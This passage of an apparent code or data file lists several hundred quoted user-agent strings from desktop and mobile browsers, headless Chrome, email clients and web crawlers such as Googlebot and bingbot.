  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",
  "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko)",
  "Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7",
  "MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)",
  "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
  "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
  "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
  "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0",
  "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1",
  "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36",
  "Wget/1.17.1 (linux-gnu)",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
  "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring",
  "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0",
  "WirtschaftsWoche-iOS-1.1.14-20200824.1315",
  "[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7",
